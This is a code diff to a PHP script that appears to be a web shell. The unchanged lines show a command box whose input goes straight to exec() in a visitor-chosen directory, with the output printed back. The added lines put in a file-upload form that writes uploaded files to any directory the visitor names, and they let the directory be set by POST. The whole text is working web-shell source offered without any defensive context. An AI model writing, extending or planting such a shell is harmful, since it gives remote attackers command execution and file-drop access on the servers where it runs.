@@ -63,6 +63,9 @@ function printPerms($file) {
 
 
 $dir = $_GET['dir'];
+if (isset($_POST['dir'])) {
+	$dir = $_POST['dir'];
+}
 $file = '';
 if ($dir == NULL or !is_dir($dir)) {
 	if (is_file($dir)) {
@@ -80,6 +83,25 @@ echo "\n<br><form action='".$_SERVER['PHP_SELF']."' method='GET'>";
 echo "<input type='hidden' name='dir' value=".$dir." />";
 echo "<input type='text' name='cmd' autocomplete='off' autofocus>\n<input type='submit' value='Execute'>\n";
 echo "</form>";
+echo "\n<br>\n<div class='navbar-form'><form action='".$_SERVER['PHP_SELF']."' method='POST' enctype='multipart/form-data'>\n";
+echo "<input type='hidden' name='dir' value='".$_GET['dir']."'/> ";
+echo "<input type='file' name='fileToUpload' id='fileToUpload'>\n<br><input type='submit' value='Upload File' name='submit'>";
+echo "</div>";
+
+if (isset($_POST['submit'])) {
+	$uploadDirectory = $dir.'/'.basename($_FILES['fileToUpload']['name']);
+	if (file_exists($uploadDirectory)) {
+    	echo "<br><br><b style='color:red'>Error. File already exists in ".$uploadDirectory.".</b></br></br>";
+	}
+	else if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $uploadDirectory)) {
+		echo '<br><br><b>File '.$_FILES['fileToUpload']['name'].' uploaded successfully in '.$dir.' !</b><br>';
+	} else {
+		echo '<br><br><b style="color:red">Error uploading file '.$uploadDirectory.'</b><br><br>';
+
+	}
+
+}
+
 if (isset($_GET['cmd'])) {
 	echo "<br><br><b>Result of command execution: </b><br>";
 	exec('cd '.$dir.' && '.$_GET['cmd'], $cmdresult);
